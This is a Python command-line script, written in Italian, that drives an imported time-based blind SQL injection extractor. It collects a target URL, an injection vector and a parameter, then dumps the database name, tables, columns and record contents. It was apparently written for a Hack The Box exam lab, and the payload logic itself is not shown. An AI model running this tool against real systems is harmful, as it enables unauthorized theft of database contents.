from blind_sqli_time_extractor import BlindSQLITimeExtractor
import os


extractor = BlindSQLITimeExtractor()

def define_url():
    url_input = input(f"Inserisci l'url da utilizzare (default: {extractor.settings.url}): ").strip()
    if url_input:
        extractor.set_url(url_input)
    print(f"URL selezionato: {extractor.settings.url}\n")
def define_delay():
    delay_input = input(f"Inserisci il delay da utilizzare (default: {extractor.settings.delay}): ").strip()
    if delay_input:
        try:
            extractor.set_delay(int(delay_input))
        except ValueError:
            print("Errore: il delay deve essere un numero intero.")
    print(f"Delay selezionato: {extractor.settings.delay}\n")
def define_vector():
    print("Definisci il vettore per l'injection:")
    print("1. via POST")
    print("2. via GET")
    print("3. via HEADER")
    vector_input = input("Seleziona il vettore (1/2/3) oppure 'q' per uscire: ").strip()
    if not vector_input:
        if not extractor.settings.hurry_up:
            print("Il parametro è obbligatorio !")
            return 
        vector_input = '3'
    if vector_input != '1' and vector_input != '2' and vector_input != '3' and vector_input.lower() != 'q':
        print("Vettore non valido. Inserisci 1, 2 oppure 3.")
        return
    print("\r\n")
    return vector_input

def set_parameters(vector_input, for_the_target=True):
    params_input = input("Inserisci i parametri da utilizzare per l'attacco - 1 SOLA RIGA - (es. 'Cookie: PHPSESSID=nqgure9mkvdgttujk25g2mehgu; TrackingId=5ada769c29c97c7b24be712c4c5702f6' per l'HEADER): ").strip()
    if not params_input:
        if not extractor.settings.hurry_up:
            print("I parametri sono obbligatori !")
            return 
        params_input = 'Cookie: PHPSESSID=nqgure9mkvdgttujk25g2mehgu; TrackingId=5ada769c29c97c7b24be712c4c5702f6'

    if vector_input == "1":
        extractor.set_post_parameters(params_input)

    elif vector_input == "2":
        extractor.set_get_parameters(params_input)

    elif vector_input == "3":
        extractor.set_header_parameters(params_input)
        if for_the_target:
            delimiter_input = input(f"Inserisci il delimitatore utilizzato per separare i parametri nell'header - ad es. ';' - (default: {extractor.settings.delimiter}): ").strip()
            if delimiter_input and for_the_target:
                extractor.set_delimiter(delimiter_input)
            print(f"Delimitatore selezionato: '{extractor.settings.delimiter}'\n")

    elif vector_input.lower() == "q":
        print("Uscita dal programma.")
        return
def set_parameter_target():
    param_target_input = input("Inserisci il nome del parametro da utilizzare per l'injection (es. 'TrackingId' per HEADER): ").strip()
    if not param_target_input:
        if not extractor.settings.hurry_up:
            print("Il nome del parametro target è obbligatorio !")
            return 
        param_target_input = 'TrackingId'

    r = extractor.set_parameter_target(param_target_input)
    print("\r\n")
    if not r:
        return
def set_optional_db_name():
    db_name_input = input("Inserisci il nome del database (OPZIONALE): ").strip()
    if db_name_input:
        extractor.set_db_name(db_name_input)
    print(f"Nome del database selezionato: {extractor.db_name}\n")

def have_headers():
    print("Ci sono degli header da impostare (es. 'User-Agent: Mozilla/5.0, Referer: http://example.com') ?")
    headers_input = input("Inserisci tutti gli header in un'unica stringa oppure premi INVIO per saltare: ").strip()
    if headers_input:
        extractor.set_header_parameters(headers_input, False)
    print("\r\n")

def print_data(settings: dict):
    print("\n" + "=" * 50)
    for key, value in settings.__dict__.items():
        if isinstance(value, dict) or isinstance(value, list):
            if not value:
                print(f"{key}: {{}}")
                continue
            print(f"{key}:")

        if isinstance(value, dict):
            for sub_key, sub_value in value.items():
                print(f"  {sub_key}: {sub_value}")
            continue

        if isinstance(value, list):
            for item in value:
                print(f"  - {item}")
            continue

        print(f"{key}: {value}")
    print("=" * 50 + "\n\r\n")

def extact_db_name():
    if extractor.extracted_data.db_name_length > 0:
        print(f"E' già stata trovata la lunghezza del DB: {extractor.extracted_data.db_name_length}")

        if extractor.extracted_data.db_name:
            print(f"E' già stato trovato il nome del DB: {extractor.extracted_data.db_name}")
            retry_input = input("Vuoi provare a estrarre nuovamente il nome del DB (y/n) ? ").strip().lower()
            if retry_input != "y":
                return
    else:
        table_length_input = input("Sai già la lunghezza del nome del DB (INVIO per saltare) ? Scrivilo a numeri: ").strip()
        extractor.extracted_data.db_name_length = int(table_length_input) if table_length_input else None

    extractor.extract_db_name()



def run_cli():
    os.system("cls" if os.name == "nt" else "clear")
    print("\r\n" + "=" * 50)
    print("CONSOLE INTERATTIVA - Blind SQL Injection - Time-Based\r\n")
    print("Questo micro-tool è da utilizzare solo dopo aver trovato la vulnerabilità per l'injection e aver verificato che sia di tipo time-based.\r\n")
    print("Permette di estrarre informazioni dal database sfruttando la vulnerabilità di SQL Injection in modalità blind, utilizzando il delay come canale " \
    "di comunicazione per dedurre i dati.\r\n")
    print("Ho provato a sostenere l'esame più volte con SQLMap ma non sono mai riuscito ad estrarre alcuna informazione, per questo ho realizzato questo tool.\r\n")
    print("Quindi ricordati di:")
    print(" - Aver ottenuto l'IP da HTB e di aver attivato la VPN")
    print(" - Aver individuato una vulnerabilità di SQL Injection di tipo time-based - Burp repeater aitua molto (non dimenticare di codificare le query che inserisci)")
    print("=" * 50 + "\r\n\r\n\r\n\r\n")

    use_saved_settings = False
    use_saved_data = False
    check_saved_settings = extractor.check_saved_settings()
    if check_saved_settings:
        load_settings_input = input("Sono state trovate delle impostazioni salvate in precedenza. Vuoi visualizzarle (y/n) ?").strip().lower()
        if load_settings_input == "y":
            saved_data = extractor.load_saved_data()
            if saved_data is None or "settings" not in saved_data: return
            print_data(saved_data['settings'])
            use_saved_settings_input = input("Vuoi utilizzare queste impostazioni (y/n) ?").strip().lower()
            if use_saved_settings_input == "y":
                extractor.restore_saved_settings(saved_data['settings'])
                use_saved_settings = True
                print("Impostazioni caricate con successo !")
            if saved_data is not None and "extracted_data" in saved_data:
                print("Sono stati trovati dei dati estratti in precedenza:")
                print_data(saved_data['extracted_data'])
                use_saved_data_input = input("Vuoi visualizzarli (y/n) ?").strip().lower()
                if use_saved_data_input == "y":
                    extractor.restore_extracted_data(saved_data['extracted_data'])
                    use_saved_data = True
                    print("Dati caricati con successo !")

    if not use_saved_settings:
        define_url()
        define_delay()
        vector_input = define_vector()
        set_parameters(vector_input)
        set_parameter_target()

        have_headers()
        set_optional_db_name()

        print_data(extractor.settings)


    print("Funzioni disponibili:")
    print("1. Estrai il nome del DB")
    print("2. Estrai le tabelle presenti nel DB")
    print("3. Estrai le colonne e il numero di righe di una tabella")
    print("4. Estrai il contenuto di uno specifico record")

    while True:
        scelta = input("\nSeleziona una funzione (1/2/3/4) oppure 'q' per uscire: ").strip().lower()

        if scelta == "q":
            print("Uscita dal programma.")
            break
        elif scelta == "1":
            extact_db_name()
        elif scelta == "2":
            num_tables_input = input("Sai già il numero di tabelle presenti nel DB (INVIO per saltare) ? Scrivilo a numeri: ").strip()
            extractor.extract_tables(num_tables_input)
        elif scelta == "3":
            table_name = input("Inserisci il nome della tabella: ").strip()
            if table_name:
                extractor.extract_table_info(table_name)
            else:
                print("Errore: il nome della tabella è obbligatorio!")
        elif scelta == "4":
            column_name = input("Inserisci il nome della colonna: ").strip()
            table_name = input("Inserisci il nome della tabella: ").strip()
            row_number = input("Inserisci il numero della riga (partendo da 1): ").strip()
            if table_name and column_name and row_number:
                extractor.set_table_target(table_name)
                try:
                    extractor.extract_record_content(column_name, int(row_number))
                except ValueError:
                    print("Errore: il numero di riga deve essere un intero.")
            else:
                print("Errore: tutti i parametri sono obbligatori!")
        else:
            print("Scelta non valida. Inserisci 1, 2, 3 oppure 4.")

    print("\n" + "=" * 50)
    print("Programma terminato")
    print("=" * 50 + "\n")


if __name__ == "__main__":
    run_cli()
